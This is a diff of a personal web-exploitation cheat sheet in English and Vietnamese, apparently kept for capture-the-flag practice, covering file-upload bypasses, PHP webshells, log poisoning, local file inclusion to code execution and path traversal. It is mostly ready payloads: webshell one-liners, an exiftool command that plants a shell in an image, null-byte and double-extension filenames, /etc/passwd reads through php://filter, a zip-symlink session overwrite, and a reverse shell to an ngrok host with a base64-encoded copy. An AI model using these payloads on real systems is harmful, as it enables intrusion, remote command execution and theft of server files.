@@ -1,5 +1,21 @@
+-------------------------------------C#
+ProcessStartInfo startInfo = new ProcessStartInfo();
+startInfo.FileName = "cmd.exe";
+startInfo.Arguments = "/c systeminfo";
+startInfo.RedirectStandardOutput = true;
+startInfo.UseShellExecute = false;
+Process process = new Process();
+process.StartInfo = startInfo;
+process.Start();
+string output = process. StandardOutput.ReadToEnd();
+Console.WriteLine("Output: "+ output);
+
+https://viblo.asia/p/java-webshell-part-1-mot-vai-phuong-phap-tao-ra-jsp-webshell-r1QLxxmpLAw
+#---------------------------------------------
+https://viblo.asia/p/file-upload-vulnerabilities-cac-lo-hong-upload-tep-tin-phan-3-WR5JRDndVGv
+/a.png/b.php phát hiện file b.php không tồn tại sẽ xử lý file a.png nhu file php
 <?php system($_GET['cmd']);?>
-<?=`$_GET[0]`?>
+<?php`$_GET[0]`?>
 concat/group_concat(0x3c,'?php ',' phpinfo(); ?',0x3e)
 abc.php.php
 test.php%00.png , test.php\x00.png
@@ -10,20 +26,35 @@ change file signature
 PYTHON save file by command 
 exiftool -Comment="<?php system($_GET['cmd']);?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 
+if web shell is an image, find the include to include that's is image will trigger php code
+https://aidanstansfield.github.io/2020/05/15/sharkyctf-penteeeeest.html#exploiting-png-upload
+
+https://laxiisteam.blogspot.com/2023/07/va-loi-cam-on-en-tac-gia.html
+filename -> cmdi
 inject php to log file
 by change user-agent; referer   requestline
+https://laxiisteam.blogspot.com/2023/09/patriotctf-va-spycio.html
+sh -i >& /duv/tcp/0.tcp.ap.ngrok.io/10816 0>&1 
+c2ggLWkgPiYgL2R1di90Y3AvMC50Y3AuYXAubmdyb2suaW8vMTA4MTYgMD4mMQ==
+----------------------------------------------------race condition
+https://nguyendt.hashnode.dev/crewctf-2022
+https://github.com/DoQuangPhu/CTF_writeups/tree/main/BKCTF/Web/web-metadata_checker
 
-https://nguyendt.hashnode.dev/crewctf-2022 --race condition
+https://github.com/DoQuangPhu/CTF_writeups/tree/main/BKCTF/Web/web-Image_Copy_Resampled
+https://github.com/huntergregal/PNG-IDAT-Payload-Generator/
 
 /proc/   chứa info process đang chạy
 /proc/self/environ     là file symlink ảo trỏ tới thư mục của process hiện tại ( process đang excec)
-
-tạo ra vòng lặp vô hạn bằng cách thay đổi para từ url từ string -> obj
-test?guess[length]=9999999999999999999 
 ----------------------------------------------------------------------path traversal
+--------------------------------------LFI--->RCE
 https://hackmd.io/@endy/rkcs_lYF2#Magic-Login-Harder
 https://viblo.asia/p/php-magic-ctf-writeups-gwd43kpK4X9
 pearcmd.php (hay peclcmd.php)
+
+https://hackmd.io/@endy/Skxms9eW2
+https://github.com/synacktiv/php_filter_chain_generator
+https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
+--------------------------------------------------
 
 encode 1 or 2 url
 ..../..../..../
@@ -43,6 +74,20 @@ localhost:1111/read.php?file=file:///etc/passwd
 php://filter/convert.base64-encode/resource=/etc/passwd
 https://www.kiso.vn/directory-traversal-vulnerabilities-phan-4.html
 
+--------------------------------------------------------------------URI bypass filter
+https://ctf.rip/asis-ctf-2016-binarycloud-web-challenge/
+<?php
+// single slash case
+$uri = "/upload?/home/binarycloud/";
+$data = parse_url($uri);
+print_r($data);
+
+// doubleslash case
+$uri = "//upload?/home/binarycloud/";
+$data = parse_url($uri);
+print_r($data);
+?>
+----------------------------------------------------------------------
 untrusted data  rơi vào những hàm xử lý đường dẫn
 impact: thao túng file path
 
@@ -51,6 +96,8 @@ python evilarc.py -o unix -f exploit.zip sess_ -p var/lib/php/sessions
 ln -s originfile  newfile
 zip -r --symlinks demo.zip symlinkfile
 zip -y demo.zip symlinkfile 
+
+https://github.com/capture0x/LFI-FINDER   #tool find LFI
 #-------------------------------------------------
 https://viblo.asia/p/directory-traversal-vulnerabilities-cac-lo-hong-directory-traversal-path-traversal-phan-5-EvbLbkY1Vnk
 Luôn thực hiện input validation: Kiểm tra đồng thời tên file, content-type, header, file size mỗi khi thực hiện kiểm tra các file upload
